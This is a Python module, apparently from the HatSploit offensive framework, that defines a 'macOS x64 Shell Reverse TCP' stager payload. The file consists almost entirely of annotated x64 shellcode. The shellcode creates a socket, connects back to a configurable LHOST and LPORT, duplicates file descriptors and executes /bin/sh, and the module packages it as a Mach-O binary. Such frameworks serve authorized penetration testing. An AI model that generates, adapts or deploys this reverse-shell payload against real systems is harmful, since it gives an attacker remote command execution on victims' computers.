#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatvenom import HatVenom
from core.lib.payload import Payload
from utils.tcp import TCPClient


class HatSploitPayload(Payload, HatVenom, TCPClient):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Shell Reverse TCP",
        'Payload': "macos/x64/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Shell reverse TCP payload for macOS x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "macos",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        offsets = {
            'lhost': local_host,
            'lport': local_port
        }

        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x41\xb0\x02"      # movb  $2, %r8b
            b"\x49\xc1\xe0\x18"  # shlq  $24, %r8
            b"\x49\x83\xc8\x61"  # orq  $97, %r8
            b"\x4c\x89\xc0"      # movq	 %r8, %rax
            b"\x48\x31\xd2"      # xorq  %rdx, %rdx
            b"\x48\x89\xd6"      # movq  %rdx, %rsi
            b"\x48\xff\xc6"      # incq  %rsi
            b"\x48\x89\xf7"      # movq  %rsi, %rdi
            b"\x48\xff\xc7"      # incq	 %rdi
            b"\x0f\x05"          # syscall
            b"\x49\x89\xc4"      # movq	 %rax, %r12
            b"\x49\xbd\x01\x01"  # movabsq  $-2750349055, %r13
            b":lport:port:"      # port
            b":lhost:ip:"        # host
            b"\x41\xb1\xff"      # movb  $-1, %r9b
            b"\x4d\x29\xcd"      # subq	 %r9, %r13
            b"\x41\x55"          # pushq  %r13
            b"\x49\x89\xe5"      # movq	 %rsp, %r13
            b"\x49\xff\xc0"      # incq	 %r8
            b"\x4c\x89\xc0"      # movq	 %r8, %rax
            b"\x4c\x89\xe7"      # movq	 %r12, %rdi
            b"\x4c\x89\xee"      # movq	 %r13, %rsi
            b"\x48\x83\xc2\x10"  # addq	 $16, %rdx
            b"\x0f\x05"          # syscall
            b"\x49\x83\xe8\x08"  # subq	 $8, %r8
            b"\x48\x31\xf6"      # xorq	 %rsi, %rsi
            b"\x4c\x89\xc0"      # movq	 %r8, %rax
            b"\x4c\x89\xe7"      # movq	 %r12, %rdi
            b"\x0f\x05"          # syscall
            b"\x48\x83\xfe\x02"  # cmpq	 $2, %rsi
            b"\x48\xff\xc6"      # incq	 %rsi
            b"\x76\xef"          # jbe  -17 <dup>
            b"\x49\x83\xe8\x1f"  # subq	 $31, %r8
            b"\x4c\x89\xc0"      # movq	 %r8, %rax
            b"\x48\x31\xd2"      # xorq	 %rdx, %rdx
            b"\x49\xbd\xff\x2f\x62\x69\x6e\x2f\x73\x68"  # movabsq  $7526411553527181311, %r13
            b"\x49\xc1\xed\x08"  # shrq	 $8, %r13
            b"\x41\x55"          # pushq  %r13
            b"\x48\x89\xe7"      # movq	 %rsp, %rdi
            b"\x48\x31\xf6"      # xorq	 %rsi, %rsi
            b"\x0f\x05"          # syscall
        )

        self.output_process("Generating payload...")
        payload = self.generate('macho', 'x64', shellcode, offsets)

        return payload
